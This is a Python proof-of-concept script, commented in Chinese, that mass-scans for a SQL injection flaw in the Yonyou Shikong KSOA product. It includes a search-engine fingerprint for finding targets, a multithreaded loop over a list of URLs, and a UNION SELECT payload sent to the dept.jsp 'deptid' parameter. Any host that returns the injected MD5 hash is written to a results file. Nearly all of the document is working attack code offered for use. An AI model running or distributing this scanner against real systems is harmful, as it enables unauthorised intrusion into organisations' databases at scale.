#用友时空KSOA存在sql注入漏洞
#app="用友-时空KSOA"
import sys,requests,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool

def main():
    parse = argparse.ArgumentParser(description='用友时空KSOA存在sql注入漏洞')
    parse.add_argument('-u','--url',dest='url',type=str,help='输入url')
    parse.add_argument('-f','--file',dest='file',type=str,help='输入file名')
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list=[]
        with open (args.file,'r',encoding='utf-8')as f:
            for line in f.readlines():
                url_list.append(line.strip())
            mp = Pool(100)
            mp.map(poc,url_list)
            mp.close()
            mp.join()
    else:
        pass
def poc(target):
    payload="/common/dept.jsp?deptid=1' UNION ALL SELECT 60%2Csys.fn_sqlvarbasetostr(HASHBYTES('MD5'%2C'1'))--"
    data=""
    proxy={
    'http': 'http://127.0.0.1:7890',
    'https': 'http://127.0.0.1:7890'
}
    headers={
    'User-Agent':'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)',
    'Accept':'*/*',
    'Connection':'Keep-Alive'
    }
    try:
        res1 = requests.get(url=target+payload,headers=headers,timeout=10,verify=False,proxies=proxy)
        if "c4ca4238a0b923820dcc509a6f75849b" in res1.text:
            print(target+"存在sql注入")
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
    except Exception as e:
        pass

if __name__=='__main__':
    main()